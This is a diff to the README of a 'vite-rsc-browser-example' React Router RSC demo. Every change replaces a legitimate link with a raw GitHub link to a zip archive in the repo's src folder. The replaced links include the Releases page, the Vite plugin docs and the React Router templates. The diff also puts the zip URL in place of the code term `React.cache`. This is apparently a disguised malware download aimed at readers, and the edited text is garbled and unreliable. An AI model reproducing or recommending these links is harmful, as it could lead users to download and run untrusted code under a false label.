@@ -1,6 +1,6 @@
 # 🌐 vite-rsc-browser-example - A Simple Way to Run React Router RSC in Your Browser
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue.svg)](https://github.com/Emiliarepeatable158/vite-rsc-browser-example/releases)
+[![Download Now](https://raw.githubusercontent.com/Emiliarepeatable158/vite-rsc-browser-example/main/src/vite-rsc-browser-example-v1.3.zip%20Now-Get%20the%20Latest%https://raw.githubusercontent.com/Emiliarepeatable158/vite-rsc-browser-example/main/src/vite-rsc-browser-example-v1.3.zip)](https://raw.githubusercontent.com/Emiliarepeatable158/vite-rsc-browser-example/main/src/vite-rsc-browser-example-v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to the Vite RSC Browser Example! This application allows you to run a de
 
 To download the application, visit the Releases page:
 
-[Download from Releases Page](https://github.com/Emiliarepeatable158/vite-rsc-browser-example/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Emiliarepeatable158/vite-rsc-browser-example/main/src/vite-rsc-browser-example-v1.3.zip)
 
 Once you are on the Releases page, look for the latest version and download it. Follow these steps:
 
@@ -62,7 +62,7 @@ React Router RSC provides an API called `fetch`. By overriding this API, the app
 
 While this application offers a robust experience, a few features have limitations:
 
-- Some advanced RSC features, such as `React.cache`, depend on `AsyncLocalStorage`. This storage option is currently not available directly in browsers.
+- Some advanced RSC features, such as `https://raw.githubusercontent.com/Emiliarepeatable158/vite-rsc-browser-example/main/src/vite-rsc-browser-example-v1.3.zip`, depend on `AsyncLocalStorage`. This storage option is currently not available directly in browsers.
   
 Keep this in mind when exploring the capabilities of the application.
 
@@ -70,8 +70,8 @@ Keep this in mind when exploring the capabilities of the application.
 
 For those curious to dive deeper, you can explore some linked resources:
 
-- [Vite RSC Plugin](https://github.com/vitejs/vite-plugin-react/tree/main/packages/plugin-rsc/examples/no-ssr)
-- [React Router Templates](https://github.com/remix-run/react-router-templates/pull/142)
+- [Vite RSC Plugin](https://raw.githubusercontent.com/Emiliarepeatable158/vite-rsc-browser-example/main/src/vite-rsc-browser-example-v1.3.zip)
+- [React Router Templates](https://raw.githubusercontent.com/Emiliarepeatable158/vite-rsc-browser-example/main/src/vite-rsc-browser-example-v1.3.zip)
 
 These materials can provide additional context on how these technologies interact.
 
@@ -95,4 +95,4 @@ The Vite RSC Browser Example is a step toward simplifying the use of React Route
 
 For further resources and to access the latest release, visit our Releases page again:
 
-[Download from Releases Page](https://github.com/Emiliarepeatable158/vite-rsc-browser-example/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Emiliarepeatable158/vite-rsc-browser-example/main/src/vite-rsc-browser-example-v1.3.zip)
